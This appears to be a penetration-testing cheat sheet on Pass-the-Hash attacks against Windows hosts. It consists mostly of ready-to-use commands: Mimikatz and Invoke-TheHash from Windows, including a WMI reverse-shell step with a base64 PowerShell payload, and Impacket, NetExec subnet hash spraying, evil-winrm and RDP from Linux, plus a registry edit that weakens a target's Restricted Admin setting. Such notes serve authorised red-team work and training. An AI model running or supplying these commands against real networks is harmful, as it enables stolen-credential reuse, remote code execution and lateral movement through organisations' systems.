# Pass the Hash (PtH)

## From Windows

Mimikatz — spawns a process in the target user's context:

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTHASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

Invoke-TheHash SMB — exec command as target user, no local admin needed client-side:

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTHASH> -Command "<CMD>" -Verbose
```

Invoke-TheHash WMI — use for reverse shell (base64 PS payload from revshells.com):

```powershell
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTHASH> -Command "powershell -e <B64>"
```

## From Linux

Impacket psexec — lands as SYSTEM, noisy (drops binary to ADMIN$):

```bash
impacket-psexec <USER>@<TARGET> -hashes :<NTHASH>
```

Also works: `impacket-wmiexec`, `impacket-atexec`, `impacket-smbexec` — same syntax.

NetExec spray across subnet — `-d .` for local accounts, `--local-auth` equivalent:

```bash
netexec smb <CIDR> -u Administrator -d . -H <NTHASH>
netexec smb <TARGET> -u Administrator -d . -H <NTHASH> -x whoami
```

evil-winrm PTH — use when SMB is blocked or no admin rights for psexec:

```bash
evil-winrm -i <TARGET> -u <USER> -H <NTHASH>
```

RDP PTH — requires Restricted Admin Mode enabled on target first:

```bash
# enable on target if you have cmd access first:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:<TARGET> /u:<USER> /pth:<NTHASH>
```

> [!warning] UAC blocks PTH for non-RID-500 local accounts by default (`LocalAccountTokenFilterPolicy=0`). Only the built-in Administrator account works for local PTH unless the policy is set to 1. Domain accounts with local admin rights are unaffected by this restriction.

> [!tip] `(Pwn3d!)` in netexec output = local admin confirmed. Sweep the whole subnet with one command — local admin hash reuse across hosts is extremely common in real environments.
